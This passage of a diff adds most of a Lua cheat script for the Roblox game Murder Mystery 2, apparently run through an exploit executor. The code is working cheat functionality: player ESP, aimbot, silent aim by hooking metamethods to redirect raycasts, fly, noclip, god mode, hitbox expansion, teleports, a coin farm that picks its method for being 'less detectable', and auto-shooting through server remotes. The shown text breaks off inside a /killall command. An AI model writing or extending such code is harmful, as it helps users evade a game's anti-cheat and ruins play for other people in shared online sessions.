+           or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            FlyKeys[key] = true
+            btn.BackgroundTransparency = 0
+        end
+    end)
+    btn.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch
+           or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            FlyKeys[key] = false
+            btn.BackgroundTransparency = 0.25
+        end
+    end)
+    return btn
+end
+
+local function ShowMobileFlyControls()
+    if MobileFlyGui then MobileFlyGui.Enabled = true return end
+
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "MM2_MobileFly"
+    sg.ResetOnSpawn = false
+    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    sg.IgnoreGuiInset = true
+    -- Try to parent to CoreGui (executor), fallback to PlayerGui
+    pcall(function() sg.Parent = CoreGui end)
+    if not sg.Parent then sg.Parent = PlayerGui end
+    MobileFlyGui = sg
+
+    -- Left side: movement D-pad (W/A/S/D)
+    local leftFrame = Instance.new("Frame")
+    leftFrame.BackgroundTransparency = 1
+    leftFrame.Position = UDim2.new(0.02, 0, 0.55, 0)
+    leftFrame.Size = UDim2.new(0, 200, 0, 200)
+    leftFrame.Parent = sg
+
+    -- W (top)
+    MobileButtons.W = CreateMobileButton(sg, "W", "W",
+        UDim2.new(0.07, 50, 0.62, 0), UDim2.new(0, 60, 0, 60))
+    -- A (left)
+    MobileButtons.A = CreateMobileButton(sg, "A", "A",
+        UDim2.new(0.02, 0, 0.69, 0), UDim2.new(0, 60, 0, 60))
+    -- S (bottom)
+    MobileButtons.S = CreateMobileButton(sg, "S", "S",
+        UDim2.new(0.07, 50, 0.76, 0), UDim2.new(0, 60, 0, 60))
+    -- D (right)
+    MobileButtons.D = CreateMobileButton(sg, "D", "D",
+        UDim2.new(0.12, 100, 0.69, 0), UDim2.new(0, 60, 0, 60))
+
+    -- Right side: Up (Space) and Down (Shift)
+    MobileButtons.Space = CreateMobileButton(sg, "UP", "Space",
+        UDim2.new(0.82, 0, 0.62, 0), UDim2.new(0, 70, 0, 70))
+    MobileButtons.Shift = CreateMobileButton(sg, "DN", "Shift",
+        UDim2.new(0.82, 0, 0.72, 0), UDim2.new(0, 70, 0, 70))
+end
+
+local function HideMobileFlyControls()
+    if MobileFlyGui then
+        MobileFlyGui.Enabled = false
+    end
+end
+
+-- Update visibility based on state + device + fly enabled
+local function UpdateMobileFlyVisibility()
+    if IsMobile and State.mobileFlyControls and State.flyEnabled then
+        ShowMobileFlyControls()
+    else
+        HideMobileFlyControls()
+    end
+end
+
+-- NOTE: StartFly/StopFly are wrapped AFTER they are defined (see end of section 13.7)
+
+
+-- ============================================================
+--  13. FEATURE IMPLEMENTATIONS
+-- ============================================================
+
+-- ---------- 13.1 ESP ----------
+function ClearESP()
+    for p, objs in pairs(ESPObjects) do
+        if objs.billboard then objs.billboard:Destroy() end
+        if objs.highlight then objs.highlight:Destroy() end
+        if objs.tracer then objs.tracer:Destroy() end
+        if objs.box then objs.box:Destroy() end
+    end
+    ESPObjects = {}
+end
+
+function ApplyESP()
+    ClearESP()
+    if not State.espEnabled then return end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            CreateESPForPlayer(p)
+        end
+    end
+end
+
+function CreateESPForPlayer(p)
+    local function build()
+        local char = p.Character
+        if not char then return end
+        local head = char:FindFirstChild("Head")
+        if not head then return end
+
+        -- Supprimer l'ancien ESP de ce joueur
+        if ESPObjects[p] then
+            for _, obj in pairs(ESPObjects[p]) do
+                if obj and obj.Destroy then obj:Destroy() end
+            end
+        end
+        ESPObjects[p] = {}
+
+        local role = GetRole(p)
+        local color = RoleColor(role)
+
+        -- Billboard pour nom + distance
+        if State.espNames or State.espDistance then
+            local bb = Instance.new("BillboardGui")
+            bb.Name = "MM2_ESP"
+            bb.Adornee = head
+            bb.AlwaysOnTop = true
+            bb.Size = UDim2.new(0, 200, 0, 50)
+            bb.StudsOffset = Vector3.new(0, 2.5, 0)
+            bb.Parent = PlayerGui
+
+            local lbl = Instance.new("TextLabel")
+            lbl.BackgroundTransparency = 1
+            lbl.Size = UDim2.new(1, 0, 1, 0)
+            lbl.Font = Enum.Font.GothamBold
+            lbl.TextSize = 14
+            lbl.TextColor3 = color
+            lbl.TextStrokeTransparency = 0.4
+            lbl.Text = p.Name .. " [" .. role .. "]"
+            lbl.Parent = bb
+            ESPObjects[p].billboard = bb
+            ESPObjects[p].label = lbl
+        end
+
+        -- Highlight (role color)
+        local hl = Instance.new("Highlight")
+        hl.Name = "MM2_HL"
+        hl.Adornee = char
+        hl.FillColor = color
+        hl.FillTransparency = 0.5
+        hl.OutlineColor = color
+        hl.OutlineTransparency = 0
+        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        hl.Parent = PlayerGui
+        ESPObjects[p].highlight = hl
+
+        -- Tracer (Drawing)
+        if State.espTracers and Drawing then
+            local tr = Drawing.new("Line")
+            tr.Thickness = 1.5
+            tr.Color = color
+            tr.Transparency = 1
+            tr.Visible = true
+            ESPObjects[p].tracer = tr
+        end
+
+        -- Box (Drawing)
+        if State.espBox and Drawing then
+            local sq = Drawing.new("Square")
+            sq.Thickness = 1.5
+            sq.Color = color
+            sq.Filled = false
+            sq.Visible = true
+            ESPObjects[p].box = sq
+        end
+    end
+
+    build()
+    -- Rebuild sur respawn
+    p.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        if State.espEnabled then build() end
+    end)
+end
+
+-- Update ESP chaque frame
+local function UpdateESP(dt)
+    if not State.espEnabled then return end
+    local center = Camera.ViewportSize
+    local bottom = Vector2.new(center.X / 2, center.Y)
+
+    for p, objs in pairs(ESPObjects) do
+        local char = p.Character
+        if not char then continue end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local head = char:FindFirstChild("Head")
+        if not hrp or not head then continue end
+
+        local role = GetRole(p)
+        local color = RoleColor(role)
+
+        -- Update highlight color (role may change)
+        if objs.highlight then
+            objs.highlight.FillColor = color
+            objs.highlight.OutlineColor = color
+        end
+
+        -- Update label
+        if objs.label then
+            local dist = math.floor((Camera.CFrame.Position - hrp.Position).Magnitude)
+            local txt = ""
+            if State.espNames then txt = p.Name .. " [" .. role .. "]" end
+            if State.espDistance then txt = txt .. "\n" .. dist .. " studs" end
+            objs.label.Text = txt
+            objs.label.TextColor3 = color
+        end
+
+        -- Update tracer
+        if objs.tracer then
+            local sp, onScreen = Camera:WorldToViewportPoint(head.Position)
+            if onScreen then
+                objs.tracer.From = bottom
+                objs.tracer.To = Vector2.new(sp.X, sp.Y)
+                objs.tracer.Color = color
+                objs.tracer.Visible = true
+            else
+                objs.tracer.Visible = false
+            end
+        end
+
+        -- Update box
+        if objs.box then
+            local sp, onScreen = Camera:WorldToViewportPoint(char:GetBoundingBox().Position)
+            if onScreen then
+                local dist = (Camera.CFrame.Position - hrp.Position).Magnitude
+                local size = math.clamp(1000 / dist, 20, 300)
+                objs.box.Size = Vector2.new(size, size * 2)
+                objs.box.Position = Vector2.new(sp.X - size / 2, sp.Y - size)
+                objs.box.Color = color
+                objs.box.Visible = true
+            else
+                objs.box.Visible = false
+            end
+        end
+    end
+end
+
+-- ---------- 13.2 ESP des coins ----------
+function ApplyCoinESP()
+    ClearCoinESP()
+    if not State.coinESP then return end
+    local cc = Workspace:FindFirstChild("CoinContainer", true)
+    if not cc then return end
+    for _, coin in ipairs(cc:GetDescendants()) do
+        if coin:IsA("BasePart") and coin.Name == "Coin" then
+            local hl = Instance.new("Highlight")
+            hl.Adornee = coin
+            hl.FillColor = Color3.fromRGB(255, 215, 0)
+            hl.FillTransparency = 0.3
+            hl.OutlineColor = Color3.fromRGB(255, 215, 0)
+            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            hl.Parent = PlayerGui
+            CoinESPObjects[coin] = hl
+        end
+    end
+end
+
+function ClearCoinESP()
+    for _, hl in pairs(CoinESPObjects) do
+        if hl then hl:Destroy() end
+    end
+    CoinESPObjects = {}
+end
+
+-- ---------- 13.3 Aimbot (RenderStepped) ----------
+local function UpdateAimbot(dt)
+    if not State.aimbotEnabled then return end
+    local target = GetClosestPlayerToCursor("Closest")
+    if target and target.Character then
+        local part = target.Character:FindFirstChild(State.aimbotTarget)
+        if part then
+            local cur = Camera.CFrame
+            local tgt = CFrame.new(cur.Position, part.Position)
+            Camera.CFrame = cur:Lerp(tgt, 1 - State.aimbotSmooth)
+        end
+    end
+end
+
+-- ---------- 13.4 Aimlock ----------
+local function UpdateAimlock(dt)
+    if not State.aimlockEnabled or not State.aimlockTarget then return end
+    local p = State.aimlockTarget
+    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+        if p.Character.Humanoid.Health < 1 then
+            State.aimlockEnabled = false
+            return
+        end
+        local pos = p.Character.HumanoidRootPart.Position
+        Camera.CFrame = CFrame.new(Camera.CFrame.Position, pos)
+    end
+end
+
+-- ---------- 13.5 FOV Circle ----------
+local function UpdateFOVCircle()
+    if FOVCircle and FOVCircle.Visible then
+        local mouse = UserInputService:GetMouseLocation()
+        FOVCircle.Position = Vector2.new(mouse.X, mouse.Y)
+    end
+end
+
+-- ---------- 13.6 Silent Aim (hookmetamethod) ----------
+local oldNamecall, oldIndex
+local function SetupSilentAim()
+    if not hookmetamethod then
+        Notify("Silent Aim", "hookmetamethod unavailable on this executor", 4, "solar:warning-bold")
+        return
+    end
+
+    -- Hook __namecall pour rediriger les rayons
+    oldNamecall = hookmetamethod(game, "__namecall", function(...)
+        local args = { ... }
+        local method = getnamecallmethod()
+        if not checkcaller() and State.silentAim then
+            local target = GetClosestPlayerToCursor(State.silentTarget)
+            if target and target.Character then
+                local part = target.Character:FindFirstChild(State.aimbotTarget) or target.Character:FindFirstChild("Head")
+                if part then
+                    if method == "Raycast" and args[1] == Workspace then
+                        local origin = args[2]
+                        args[3] = (part.Position - origin).Unit * 1000
+                        return oldNamecall(unpack(args))
+                    elseif method == "FindPartOnRay" or method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRayWithWhitelist" then
+                        local ray = args[2]
+                        args[2] = Ray.new(ray.Origin, (part.Position - ray.Origin).Unit * 1000)
+                        return oldNamecall(unpack(args))
+                    end
+                end
+            end
+        end
+        return oldNamecall(...)
+    end)
+
+    -- Hook __index du Mouse pour rediriger Hit/Target
+    oldIndex = hookmetamethod(game, "__index", function(t, k)
+        if not checkcaller() and State.silentAim and t:IsA("Mouse") then
+            local target = GetClosestPlayerToCursor(State.silentTarget)
+            if target and target.Character then
+                local part = target.Character:FindFirstChild(State.aimbotTarget) or target.Character:FindFirstChild("Head")
+                if part then
+                    if k == "Target" or k == "TargetFilter" then return part end
+                    if k == "Hit" then return part.CFrame end
+                    if k == "UnitRay" then
+                        local origin = oldIndex(t, "Hit").Position
+                        return Ray.new(origin, (part.Position - origin).Unit * 1000)
+                    end
+                end
+            end
+        end
+        return oldIndex(t, k)
+    end)
+end
+
+-- ---------- 13.7 Fly ----------
+-- Modern CFrame-based fly. More reliable than BodyGyro/BodyVelocity.
+-- We also support using the same fly system for the coin farm (with its own speed).
+local FlyLoop = nil
+local FlyKeyConnections = {}
+local FlyKeys = { W = false, A = false, S = false, D = false, Space = false, Shift = false }
+
+local function bindFlyKeys()
+    -- Clean any previous bindings
+    for _, c in ipairs(FlyKeyConnections) do
+        if c and c.Disconnect then c:Disconnect() end
+    end
+    FlyKeyConnections = {}
+
+    table.insert(FlyKeyConnections, UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if input.KeyCode == Enum.KeyCode.W then FlyKeys.W = true
+        elseif input.KeyCode == Enum.KeyCode.A then FlyKeys.A = true
+        elseif input.KeyCode == Enum.KeyCode.S then FlyKeys.S = true
+        elseif input.KeyCode == Enum.KeyCode.D then FlyKeys.D = true
+        elseif input.KeyCode == Enum.KeyCode.Space then FlyKeys.Space = true
+        elseif input.KeyCode == Enum.KeyCode.LeftShift then FlyKeys.Shift = true
+        end
+    end))
+    table.insert(FlyKeyConnections, UserInputService.InputEnded:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.W then FlyKeys.W = false
+        elseif input.KeyCode == Enum.KeyCode.A then FlyKeys.A = false
+        elseif input.KeyCode == Enum.KeyCode.S then FlyKeys.S = false
+        elseif input.KeyCode == Enum.KeyCode.D then FlyKeys.D = false
+        elseif input.KeyCode == Enum.KeyCode.Space then FlyKeys.Space = false
+        elseif input.KeyCode == Enum.KeyCode.LeftShift then FlyKeys.Shift = false
+        end
+    end))
+end
+
+-- Core fly logic — used both by the manual Fly toggle and the Coin Farm.
+-- `speed` is the speed in studs/sec.
+local function flyStep(speed)
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+
+    -- Direction based on camera
+    local cam = Camera.CoordinateFrame
+    local forward = cam.LookVector
+    local right = cam.RightVector
+    local up = Vector3.new(0, 1, 0)
+
+    local move = Vector3.new(0, 0, 0)
+    if FlyKeys.W then move = move + forward end
+    if FlyKeys.S then move = move - forward end
+    if FlyKeys.D then move = move + right end
+    if FlyKeys.A then move = move - right end
+    if FlyKeys.Space then move = move + up end
+    if FlyKeys.Shift then move = move - up end
+
+    if move.Magnitude > 0 then
+        move = move.Unit * speed
+    end
+
+    -- Move the HRP directly each frame (CFrame-based — works on every executor)
+    hrp.CFrame = hrp.CFrame + move * RunService.RenderStepped:Wait()
+    -- Keep the character upright and facing camera direction
+    hrp.CFrame = CFrame.new(hrp.Position) * CFrame.Angles(0, math.atan2(-forward.X, -forward.Z), 0)
+    -- Disable the humanoid's own gravity handling while flying
+    hum.PlatformStand = true
+end
+
+function StartFly()
+    bindFlyKeys()
+    if FlyLoop then FlyLoop:Disconnect() end
+    local lastTime = tick()
+    FlyLoop = RunService.RenderStepped:Connect(function()
+        if not State.flyEnabled then
+            StopFly()
+            return
+        end
+        local char = LocalPlayer.Character
+        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+        local hrp = char.HumanoidRootPart
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+
+        local cam = Camera.CoordinateFrame
+        local forward = cam.LookVector
+        local right = cam.RightVector
+        local up = Vector3.new(0, 1, 0)
+
+        local move = Vector3.new(0, 0, 0)
+        if FlyKeys.W then move = move + forward end
+        if FlyKeys.S then move = move - forward end
+        if FlyKeys.D then move = move + right end
+        if FlyKeys.A then move = move - right end
+        if FlyKeys.Space then move = move + up end
+        if FlyKeys.Shift then move = move - up end
+
+        if move.Magnitude > 0 then
+            move = move.Unit * State.flySpeed
+        end
+
+        local now = tick()
+        local dt = math.min(now - lastTime, 0.05)
+        lastTime = now
+        hrp.CFrame = hrp.CFrame + move * dt
+        hrp.CFrame = CFrame.new(hrp.Position) * CFrame.Angles(0, math.atan2(-forward.X, -forward.Z), 0)
+        hum.PlatformStand = true
+        -- Reset velocity so the humanoid doesn't fight us
+        hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    end)
+end
+
+function StopFly()
+    if FlyLoop then FlyLoop:Disconnect() end
+    FlyLoop = nil
+    for _, c in ipairs(FlyKeyConnections) do
+        if c and c.Disconnect then c:Disconnect() end
+    end
+    FlyKeyConnections = {}
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChildOfClass("Humanoid") then
+        char:FindFirstChildOfClass("Humanoid").PlatformStand = false
+    end
+end
+
+-- Hook StartFly/StopFly to also toggle the mobile on-screen D-pad
+local _origStartFly = StartFly
+local _origStopFly = StopFly
+StartFly = function()
+    _origStartFly()
+    UpdateMobileFlyVisibility()
+end
+StopFly = function()
+    _origStopFly()
+    UpdateMobileFlyVisibility()
+end
+
+-- ---------- 13.8 Noclip ----------
+local NoclipLoop
+local function UpdateNoclip()
+    if State.noclip and LocalPlayer.Character then
+        for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") and part.CanCollide then
+                part.CanCollide = false
+            end
+        end
+    end
+end
+
+-- ---------- 13.9 WalkSpeed / JumpPower ----------
+function ApplyWalkSpeed()
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.WalkSpeed = State.walkSpeed
+    end
+end
+function ResetWalkSpeed()
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.WalkSpeed = 16
+    end
+end
+function ApplyJumpPower()
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.UseJumpPower = true
+        char.Humanoid.JumpPower = State.jumpPower
+    end
+end
+function ResetJumpPower()
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.JumpPower = 50
+    end
+end
+
+-- ---------- 13.10 God Mode ----------
+function EnableGodMode()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local h = char:FindFirstChildOfClass("Humanoid")
+    if not h then return end
+    h.Name = "1"
+    local clone = h:Clone()
+    clone.Parent = char
+    clone.Name = "Humanoid"
+    task.wait(0.1)
+    char["1"]:Destroy()
+    Camera.CameraSubject = char:FindFirstChild("Humanoid")
+    if char:FindFirstChild("Animate") then
+        char.Animate.Disabled = true
+        task.wait(0.1)
+        char.Animate.Disabled = false
+    end
+    Notify("God Mode", "God Mode enabled — do not reset while active!", 5, "solar:shield-bold")
+end
+
+-- ---------- 13.11 Fullbright ----------
+local origLighting = {}
+function EnableFullbright()
+    origLighting.Brightness = Lighting.Brightness
+    origLighting.ClockTime = Lighting.ClockTime
+    origLighting.FogEnd = Lighting.FogEnd
+    origLighting.GlobalShadows = Lighting.GlobalShadows
+    origLighting.Ambient = Lighting.Ambient
+    origLighting.OutdoorAmbient = Lighting.OutdoorAmbient
+    Lighting.Brightness = 2
+    Lighting.ClockTime = 14
+    Lighting.FogEnd = 100000
+    Lighting.GlobalShadows = false
+    Lighting.Ambient = Color3.new(1, 1, 1)
+    Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
+end
+function DisableFullbright()
+    if origLighting.Brightness then Lighting.Brightness = origLighting.Brightness end
+    if origLighting.ClockTime then Lighting.ClockTime = origLighting.ClockTime end
+    if origLighting.FogEnd then Lighting.FogEnd = origLighting.FogEnd end
+    if origLighting.GlobalShadows ~= nil then Lighting.GlobalShadows = origLighting.GlobalShadows end
+    if origLighting.Ambient then Lighting.Ambient = origLighting.Ambient end
+    if origLighting.OutdoorAmbient then Lighting.OutdoorAmbient = origLighting.OutdoorAmbient end
+end
+
+-- ---------- 13.12 X-Ray ----------
+function EnableXray(obj)
+    for _, v in ipairs(obj:GetChildren()) do
+        if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
+            v.LocalTransparencyModifier = 0.75
+        end
+        EnableXray(v)
+    end
+end
+function DisableXray(obj)
+    for _, v in ipairs(obj:GetChildren()) do
+        if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
+            v.LocalTransparencyModifier = 0
+        end
+        DisableXray(v)
+    end
+end
+
+-- ---------- 13.13 Hitbox Expander ----------
+local function UpdateHitbox()
+    if not State.hitboxExpander then return end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local head = p.Character:FindFirstChild("Head")
+            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+            for _, part in ipairs({ head, hrp }) do
+                if part and part:IsA("BasePart") then
+                    part.Size = Vector3.new(State.hitboxSize, State.hitboxSize, State.hitboxSize)
+                    part.Transparency = State.hitboxTransparency
+                    part.CanCollide = false
+                end
+            end
+        end
+    end
+end
+
+-- ---------- 13.14 Teleportation ----------
+function TeleportToPlayer(target, offset)
+    offset = offset or 0
+    if not target or not target.Character then return end
+    local myChar = LocalPlayer.Character
+    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end
+    local theirHRP = target.Character:FindFirstChild("HumanoidRootPart")
+    if not theirHRP then return end
+    if offset > 0 then
+        myChar.HumanoidRootPart.CFrame = theirHRP.CFrame * CFrame.new(0, 0, offset)
+    else
+        myChar.HumanoidRootPart.CFrame = theirHRP.CFrame
+    end
+end
+
+function TeleportToLobby()
+    local myChar = LocalPlayer.Character
+    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end
+    -- Typical MM2 lobby coordinates
+    myChar.HumanoidRootPart.CFrame = CFrame.new(-108.5, 145, 0.6)
+end
+
+function TeleportToMapSpawn()
+    local myChar = LocalPlayer.Character
+    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end
+    for _, thing in ipairs(Workspace:GetChildren()) do
+        for _, child in ipairs(thing:GetChildren()) do
+            if child.Name == "Spawns" and child:FindFirstChild("Spawn") then
+                myChar.HumanoidRootPart.CFrame = child.Spawn.CFrame
+                return
+            end
+        end
+    end
+    Notify("Teleport", "No map spawn found", 3, "solar:warning-bold")
+end
+
+-- ---------- 13.15 Coin Farm ----------
+-- Robust coin finder: scans all workspace descendants for parts named coin/token/gold/event.
+-- The CoinContainer path varies between maps in MM2, so we don't hardcode it.
+local function GetCoins()
+    local coins = {}
+    for _, v in ipairs(Workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            local n = v.Name:lower()
+            if n:find("coin") or n:find("token") or n:find("gold") or n:find("event") then
+                -- Exclude things obviously not collectible (e.g. huge map parts named "GoldFloor")
+                if v.Size.Magnitude < 50 then
+                    table.insert(coins, v)
+                end
+            end
+        end
+    end
+    return coins
+end
+
+-- Sort coins by distance to the player (nearest first)
+local function SortCoinsByDistance(coins, fromPos)
+    table.sort(coins, function(a, b)
+        return (a.Position - fromPos).Magnitude < (b.Position - fromPos).Magnitude
+    end)
+end
+
+-- Tween the player's HRP toward a coin. Uses State.coinFarmSpeed to compute travel time.
+local function TweenToCoin(hrp, coin)
+    if not coin or not coin.Parent then return false end
+    local startPos = hrp.Position
+    local targetPos = coin.Position
+    local distance = (targetPos - startPos).Magnitude
+
+    -- Travel time derived from speed (clamped between 0.2s and 2s)
+    local travelTime = math.clamp(distance / math.max(State.coinFarmSpeed, 1), 0.20, 2.0)
+
+    -- Zero out velocities to prevent physics fling
+    hrp.AssemblyLinearVelocity = Vector3.zero
+    hrp.AssemblyAngularVelocity = Vector3.zero
+
+    local targetCFrame = CFrame.new(targetPos + Vector3.new(0, 1.2, 0))
+    local tween = TweenService:Create(hrp, TweenInfo.new(travelTime, Enum.EasingStyle.Linear), { CFrame = targetCFrame })
+    tween:Play()
+
+    -- Wait for the tween to complete, aborting if the coin gets collected mid-flight
+    while tween.PlaybackState == Enum.PlaybackState.Playing do
+        if not coin or not coin.Parent then
+            tween:Cancel()
+            return false
+        end
+        if not State.coinFarm and not _G.CollectingOnce then
+            tween:Cancel()
+            return false
+        end
+        task.wait()
+    end
+
+    -- Reinforce with firetouchinterest if the executor supports it
+    if typeof(firetouchinterest) == "function" then
+        pcall(firetouchinterest, hrp, coin, 0)
+        task.wait()
+        pcall(firetouchinterest, hrp, coin, 1)
+    end
+
+    -- Zero velocity again to prevent fling after arrival
+    hrp.AssemblyLinearVelocity = Vector3.zero
+    hrp.AssemblyAngularVelocity = Vector3.zero
+    return true
+end
+
+function CollectCoinsOnce()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local coins = GetCoins()
+    if #coins == 0 then
+        return false
+    end
+
+    SortCoinsByDistance(coins, hrp.Position)
+
+    if State.coinFarmMode == "Teleport" then
+        -- Instant teleport mode (faster but more detectable)
+        local origCFrame = hrp.CFrame
+        for _, coin in ipairs(coins) do
+            if not State.coinFarm and not _G.CollectingOnce then return end
+            if coin and coin.Parent then
+                hrp.CFrame = CFrame.new(coin.Position + Vector3.new(0, 1.2, 0))
+                hrp.AssemblyLinearVelocity = Vector3.zero
+                -- Reinforce touch
+                if typeof(firetouchinterest) == "function" then
+                    pcall(firetouchinterest, hrp, coin, 0)
+                    task.wait()
+                    pcall(firetouchinterest, hrp, coin, 1)
+                end
+                task.wait(math.random(80, 200) / 1000)
+            end
+        end
+        hrp.CFrame = origCFrame
+        return true
+    end
+
+    -- Default: Tween mode (smooth, less detectable)
+    for _, coin in ipairs(coins) do
+        if not State.coinFarm and not _G.CollectingOnce then return end
+        if coin and coin.Parent then
+            TweenToCoin(hrp, coin)
+            task.wait(0.05)
+        end
+    end
+    return true
+end
+
+function StartCoinFarm()
+    task.spawn(function()
+        while State.coinFarm do
+            local ok, result = pcall(CollectCoinsOnce)
+            if not ok then
+                warn("[MM2 Hub] Coin farm error: " .. tostring(result))
+            elseif result == false then
+                -- No coins found, wait longer before retrying
+                task.wait(2)
+            else
+                task.wait(0.3)
+            end
+        end
+    end)
+end
+
+-- ---------- 13.16 Gun Drop Grabber ----------
+function GrabGunDrop()
+    local gd = Workspace:FindFirstChild("GunDrop")
+    if not gd then return end
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+    local orig = char.HumanoidRootPart.CFrame
+    char.HumanoidRootPart.CFrame = gd.CFrame
+    task.wait(0.25)
+    char.HumanoidRootPart.CFrame = orig
+end
+
+local function WatchGunDrop()
+    local seen = false
+    task.spawn(function()
+        while true do
+            local gd = Workspace:FindFirstChild("GunDrop")
+            if gd and not seen then
+                seen = true
+                if State.gunDropNotify then
+                    Notify("Gun Drop", "A GunDrop appeared!", 5, "solar:hand-stars-bold")
+                end
+                if State.gunGrabber then
+                    task.wait(0.5)
+                    GrabGunDrop()
+                end
+            elseif not gd then
+                seen = false
+            end
+            task.wait(0.5)
+        end
+    end)
+end
+
+-- ---------- 13.17 Auto-Shoot Murderer ----------
+function ShootMurderer()
+    local m = GetMurderer()
+    if not m or not m.Character then return end
+    local head = m.Character:FindFirstChild("Head")
+    if not head then return end
+    -- Method 1: FireServer on ShootEvent (generic structure)
+    local gun = nil
+    if LocalPlayer.Character then
+        gun = LocalPlayer.Character:FindFirstChild("Gun")
+    end
+    if not gun and LocalPlayer:FindFirstChild("Backpack") then
+        gun = LocalPlayer.Backpack:FindFirstChild("Gun")
+    end
+    if not gun then
+        Notify("Auto-Shoot", "You don't have a Gun (Sheriff only)", 3, "solar:warning-bold")
+        return
+    end
+    -- Equip the Gun
+    LocalPlayer.Character.Humanoid:EquipTool(gun)
+    task.wait(0.1)
+    -- Tenter plusieurs RemoteEvents connus
+    local remotes = {
+        { parent = ReplicatedStorage, name = "ShootEvent" },
+        { parent = ReplicatedStorage:FindFirstChild("Events"), name = "ShootEvent" },
+        { parent = gun, name = "Shoot" },
+        { parent = gun, name = "Fire" },
+    }
+    for _, r in ipairs(remotes) do
+        if r.parent and r.parent:FindFirstChild(r.name) then
+            local remote = r.parent[r.name]
+            if remote:IsA("RemoteEvent") then
+                pcall(function()
+                    remote:FireServer({
+                        Origin = Camera.CFrame.Position,
+                        Hit = head.CFrame,
+                        Target = head,
+                    }, gun)
+                end)
+                break
+            end
+        end
+    end
+    -- Method 2: Right click (activate tool)
+    pcall(function()
+        gun:Activate()
+    end)
+end
+
+local function AutoShootLoop()
+    if not State.autoShoot then return end
+    if GetRole(LocalPlayer) ~= "Sheriff" then return end
+    ShootMurderer()
+end
+
+-- ---------- 13.18 Murderer Notifier ----------
+local notifiedMurderer = nil
+local function WatchMurderer()
+    task.spawn(function()
+        while true do
+            if State.murdererNotify then
+                local m = GetMurderer()
+                if m and m ~= notifiedMurderer then
+                    notifiedMurderer = m
+                    Notify("Murderer detected", "The murderer is " .. m.Name, 8, "solar:knife-bold")
+                elseif not m then
+                    notifiedMurderer = nil
+                end
+            end
+            task.wait(1)
+        end
+    end)
+end
+
+-- ---------- 13.19 Anti-AFK ----------
+local function SetupAntiAFK()
+    LocalPlayer.Idled:Connect(function()
+        if State.antiAfk then
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+        end
+    end)
+end
+
+-- ---------- 13.20 Infinite Jump ----------
+local function SetupInfJump()
+    UserInputService.JumpRequest:Connect(function()
+        if State.infJump and LocalPlayer.Character then
+            local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
+        end
+    end)
+end
+
+-- ---------- 13.21 Chat Commands ----------
+local function SetupChatCommands()
+    LocalPlayer.Chatted:Connect(function(msg)
+        if not State.chatCommands then return end
+        local args = string.lower(msg):split(" ")
+        local cmd = args[1]
+        if cmd == "/fly" then
+            State.flyEnabled = not State.flyEnabled
+            if State.flyEnabled then StartFly() else StopFly() end
+            Notify("Chat", "Fly: " .. tostring(State.flyEnabled), 2, "solar:chat-bold")
+        elseif cmd == "/noclip" then
+            State.noclip = not State.noclip
+            Notify("Chat", "Noclip: " .. tostring(State.noclip), 2, "solar:chat-bold")
+        elseif cmd == "/esp" then
+            State.espEnabled = not State.espEnabled
+            if State.espEnabled then ApplyESP() else ClearESP() end
+            Notify("Chat", "ESP: " .. tostring(State.espEnabled), 2, "solar:chat-bold")
+        elseif cmd == "/tp" and args[2] then
+            local target = Players:FindFirstChild(args[2])
+            if target then
+                TeleportToPlayer(target)
+                Notify("Chat", "TP vers " .. args[2], 2, "solar:chat-bold")
+            end
+        elseif cmd == "/speed" and args[2] then
+            State.walkSpeed = tonumber(args[2]) or 32
+            State.speedEnabled = true
+            ApplyWalkSpeed()
+        elseif cmd == "/killmurderer" or cmd == "/km" then
+            local m = GetMurderer()
+            if m then
+                TeleportToPlayer(m, 3)
+                Notify("Chat", "TP vers murderer", 2, "solar:chat-bold")
+            end
+        elseif cmd == "/killall" then
+            task.spawn(function()
+                for _, v in ipairs(Players:GetPlayers()) do
+                    if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") then
+                        local start = tick()
